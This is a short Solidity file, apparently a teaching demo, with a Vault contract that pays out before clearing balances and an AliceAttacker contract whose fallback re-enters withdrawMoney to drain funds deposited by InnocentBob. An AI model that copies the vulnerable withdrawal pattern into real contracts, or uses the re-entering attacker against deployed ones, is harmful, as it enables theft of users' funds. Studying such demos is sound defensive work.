// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract Vault {
    mapping(address => uint256) public balances;

    function depositMoney() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawMoney() public {
        if (address(this).balance >= balances[msg.sender]) {
            (bool sent,) = payable(msg.sender).call{value: balances[msg.sender]}("");
            delete balances[msg.sender];
        }
    }
}

contract AliceAttacker {
    event AliceBalance(uint256 balance);

    Vault vault;

    function setVaultContract(address vaultAddress) public {
        vault = Vault(vaultAddress);
    }

    function depositMoneyIntoVault(uint256 amount) public {
        address(vault).call{value: amount}(abi.encodeWithSignature("depositMoney()"));
    }

    fallback() external payable {
        if (msg.sender == address(vault)) {
            vault.withdrawMoney();
        }

        emit AliceBalance(address(this).balance);
    }
}

contract InnocentBob {
    function depositMoneyIntoVault(uint256 amount, address vault) public {
        vault.call{value: amount}(abi.encodeWithSignature("depositMoney()"));
    }

    receive() external payable {}
}
